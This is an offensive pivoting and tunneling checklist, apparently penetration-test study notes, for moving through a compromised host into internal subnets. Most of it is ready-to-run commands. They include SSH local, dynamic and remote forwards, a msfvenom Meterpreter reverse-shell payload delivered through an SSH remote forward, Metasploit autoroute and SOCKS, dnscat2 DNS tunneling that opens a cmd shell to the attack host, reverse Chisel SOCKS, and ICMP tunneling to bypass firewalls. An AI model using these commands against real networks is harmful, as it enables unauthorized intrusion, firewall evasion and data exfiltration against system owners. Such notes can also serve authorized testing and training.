## Phase 1: Initial Discovery & Pivot Host Enumeration
- [ ] Identify secondary network interfaces and unrouted subnets on the compromised pivot host:
```
  ifconfig
  # or ip a
```

- [ ] Document internal IP ranges (e.g., `172.16.5.0/23`) and local service bindings available on the pivot host.
## Phase 2: Choosing Your Tunneling Technique

Select the appropriate pivoting mechanism based on network egress/ingress restrictions, firewall rules, and available tools:
### Option A: SSH Local Port Forwarding (`-L`)

_Best for: Accessing a specific known service (like MySQL or HTTP) running locally on a pivot host or internal destination._

- [ ] Execute the local port forward:
    ```bash
    ssh -L <local_port>:<target_ip>:<target_port> user@pivot_host
    ```
    
- [ ] Verify the forward using Netstat or Nmap:
    ```bash
    netstat -antp | grep <local_port>
    nmap -v -sV -p<local_port> localhost
    ```
### Option B: SSH Dynamic Port Forwarding & SOCKS Proxy (`-D`)
_Best for: Scanning and routing arbitrary TCP traffic across an entire internal subnet._
- [ ] Start the dynamic SSH tunnel:
    ```bash
    ssh -D 9050 user@pivot_host
    ```
    
- [ ] Configure `/etc/proxychains.conf` to point to the local listener:
    ```Plaintext
    socks4 127.0.0.1 9050
    # or socks5 127.0.0.1 9050
    ```
    
- [ ] Run enumeration tools using full TCP connect scans (`-sT`):
    ```bash
    proxychains nmap -v -Pn -sT <internal_ip>
    ```

### Option C: SSH Remote Port Forwarding (`-R`)
_Best for: Catching a reverse shell from an isolated internal host that cannot route back to your attack machine._
- [ ] Generate the payload pointing to the internal IP of the pivot host:
    ```bash
    msfvenom -p windows/x64/meterpreter/reverse_https lhost=<InternalIPofPivotHost> -f exe -o payload.exe LPORT=8080
    ```
    
- [ ] Set up a multi/handler listener on your attack host (`0.0.0.0:<local_port>`).

- [ ] Transfer the payload to the pivot host and host it via a temporary HTTP server:
    ```bash
    python3 -m http.server 8123
    ```
    
- [ ] Download the payload onto the target host and establish the SSH remote forward:
    ```bash
    ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:<local_port> user@pivot_host -vN
    ```
    
- [ ] Execute the payload on the target to catch the reverse shell.


### Option D: Meterpreter Tunneling & Port Forwarding (`autoroute` / `portfwd`)

_Best for: Maintaining access and routing traffic natively inside Metasploit without maintaining an active SSH shell._
- [ ] Establish a Meterpreter session on the pivot host.
- [ ] Add internal routes using AutoRoute:

    ```bash
    run post/multi/manage/autoroute -s <subnet>/<cidr>
    ```
    
- [ ] Spin up a local SOCKS proxy server within Metasploit:
    ```bash
    use auxiliary/server/socks_proxy
    set SRVPORT 9050
    set version 4a
    run
    ```
    
- [ ] Use `portfwd` for local/reverse port relaying:
    ```bash
    meterpreter > portfwd add -l <local_port> -p <remote_port> -r <target_ip>
    ```
    
### Option E: DNS Tunneling with Dnscat2
_Best for: Evading strict HTTP/HTTPS firewalls by exfiltrating data and spawning shells via DNS TXT records over UDP port 53._

- [ ] Start the Dnscat2 server on your attack host:
    ```bash
    sudo ruby dnscat2.rb --dns host=<attack_ip>,port=53,domain=<domain.local> --no-cache
    ```
    
- [ ] Transfer and import the client script on the target:
    ```PowerShell
    Import-Module .\dnscat2.ps1
    Start-Dnscat2 -DNSserver <attack_ip> -Domain <domain.local> -PreSharedSecret <secret> -Exec cmd
    ```
    
- [ ] Switch to the active session window on your attack host:
    ```Plaintext
    dnscat2> window -i 1
    ```
    
### Option F: SOCKS5 Tunneling with Chisel
_Best for: Fast, reliable HTTP-wrapped/SSH-secured TCP/UDP tunneling across heavily firewalled boundaries._

- [ ] **Standard Mode** _(If inbound connections to the pivot are allowed)_:
    - Run server on pivot host: `./chisel server -v -p 1234 --socks5`
    - Connect from attack host: `./chisel client -v <pivot_ip>:1234 socks`

- [ ] **Reverse Mode** _(If inbound connections to the pivot are blocked)_:
    - Run server on attack host: `sudo ./chisel server --reverse -v -p 1234 --socks5`
    - Connect from pivot host: `./chisel client -v <attack_ip>:1234 R:socks`

- [ ] Update `/etc/proxychains.conf` to point to Chisel's local port (`1080`):
    Plaintext
    ```
    socks5 127.0.0.1 1080
    ```
    
### Option G: ICMP Tunneling with Ptunnel-ng
_Best for: Bypassing TCP blocklists by encapsulating traffic inside ICMP echo requests/responses when ping is permitted._
- [ ] Build and transfer `ptunnel-ng` to the target pivot host.
- [ ] Start the server on the pivot host:
    ```bash
    sudo ./ptunnel-ng -r <pivot_ip> -R 22
    ```
    
- [ ] Connect from the attack host to bind a local port through the ICMP tunnel:
    ```bash
    sudo ./ptunnel-ng -p <pivot_ip> -l 2222 -r <pivot_ip> -R 22
    ```
    
- [ ] Tunnel SSH or layer a dynamic SOCKS proxy over the local listener:
    ```bash
    ssh -D 9050 -p 2222 -l <user> 127.0.0.1
    ```
## Phase 3: Post-Pivot Verification & Execution
- [ ] Verify active proxy chains and routing tables (`autoroute -p` or proxychains test).
- [ ] Execute full connect scans (`-sT`) and vulnerability checks against internal systems.
- [ ] Deploy client tools (RDP, Metasploit modules, custom scripts) through the established tunnels to complete objectives.